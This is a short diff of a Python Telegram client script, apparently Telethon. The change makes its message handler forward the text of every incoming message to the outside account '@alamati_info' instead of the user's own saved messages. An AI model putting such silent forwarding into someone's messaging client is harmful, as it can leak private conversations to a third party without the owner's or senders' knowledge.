@@ -24,7 +24,7 @@ async def start_bot():
         print(f"New Message: {event.text}")
         # me = await client.get_me()  # الحصول على معلومات المستخدم
         # user_id = me.id  # الحصول على معرف المستخدم
-        await client.send_message("me" , event.text)
+        await client.send_message("@alamati_info" , event.text)
 
     await client.run_until_disconnected()
 
